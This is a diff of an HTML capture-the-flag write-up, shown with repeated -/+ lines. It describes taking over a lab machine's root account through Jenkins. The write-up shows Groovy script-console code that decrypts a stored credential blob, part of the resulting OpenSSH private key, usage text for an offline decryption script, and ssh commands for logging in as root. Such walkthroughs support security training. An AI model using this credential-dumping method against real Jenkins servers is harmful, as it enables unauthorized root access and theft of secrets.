-<p>To recover the Private SSH key, I instead went with a much more direct path outlined in <a href="https://www.codurance.com/publications/2019/05/30/accessing-and-dumping-jenkins-credentials">this</a> blog post. From the jenkins management interface, I went through all the options; with the ability to modify user credentials as my target. Under the user management page was only the user <code>root</code>. And when clicking on it, we could see that there was an OpenSSH Private key present although we could not view it/edit it. But we COULD change the password set on <code>root</code>. Before doing so, I was able to find the SSH private key in a hidden parameter in the HTML source code, but I also could&rsquo;ve easily just used the key I got earlier from <code>credentials.xml</code> as they are the same. After changing the password, I went over to <code>/scripts</code> in which the Groovy script console was in which I could run arbitrary Groovy code. With this in mind, I used some of Jenkins&rsquo; build in functionality to successfully decrypt the <code>root</code> user&rsquo;s private key:</p>
-<pre tabindex="0"><code>println hudson.util.Secret.decrypt(&#34;{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}&#34;)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Usage:
+	jenkins_offline_decrypt.py &lt;jenkins_base_path&gt;
+or:
+	jenkins_offline_decrypt.py &lt;master.key&gt; &lt;hudson.util.Secret&gt; <span style="color:#f92672">[</span>credentials.xml<span style="color:#f92672">]</span>
+or:
+	jenkins_offline_decrypt.py -i &lt;path&gt; <span style="color:#f92672">(</span>interactive mode<span style="color:#f92672">)</span>
+</code></pre></div><p>Trying this out had unfortunately no luck, although it was worth a try. Would have made for a pretty easy solution all things considered.</p>
+<p>To recover the Private SSH key, I instead went with a much more direct path outlined in <a href="https://www.codurance.com/publications/2019/05/30/accessing-and-dumping-jenkins-credentials">this</a> blog post. From the jenkins management interface, I went through all the options; with the ability to modify user credentials as my target. Under the user management page was only the user <code>root</code>. And when clicking on it, we could see that there was an OpenSSH Private key present although we could not view it/edit it. But we COULD change the password set on <code>root</code>. Before doing so, I was able to find the SSH private key in a hidden parameter in the HTML source code, but I also could&rsquo;ve easily just used the key I got earlier from <code>credentials.xml</code> as they are the same. After changing the password, I went over to <code>/scripts</code> in which the Groovy script console was in which I could run arbitrary Groovy code. With this in mind, I used some of Jenkins' build in functionality to successfully decrypt the <code>root</code> user&rsquo;s private key:</p>
+<pre tabindex="0"><code>println hudson.util.Secret.decrypt(&quot;{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}&quot;)
 </code></pre><p>After clicking on <code>run</code> for the code above, it then proceeds to decrypt and print out the key successfully as:</p>
 <pre tabindex="0"><code>-----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
@@ -268,9 +268,9 @@ P3vbriPPT8CI7s2jf21LZ68tBL9VgHsFYw6xgyAI9k1+sW4s+pq6cMor++ICzT++CCMVmP
 iGFOXbo3+1sSg1AAAADHJvb3RAYnVpbGRlcgECAwQFBg==
 -----END OPENSSH PRIVATE KEY-----
 </code></pre><p>To get the root flag and complete the challenge, run:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod <span style="color:#ae81ff">600</span> &lt;ssh_key&gt; <span style="color:#75715e"># set to correct permissions for private SSH key.</span>
-</span></span><span style="display:flex;"><span>ssh -i &lt;ssh_key&gt; root@IP    <span style="color:#75715e"># SSH using the private key to successfully perform authentication as root.</span>
-</span></span></code></pre></div><p>From here, we are able to log in and get the root flag!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod <span style="color:#ae81ff">600</span> &lt;ssh_key&gt; <span style="color:#75715e"># set to correct permissions for private SSH key.</span>
+ssh -i &lt;ssh_key&gt; root@IP    <span style="color:#75715e"># SSH using the private key to successfully perform authentication as root.</span>
+</code></pre></div><p>From here, we are able to log in and get the root flag!</p>
 </div>
     </article>
   </main>
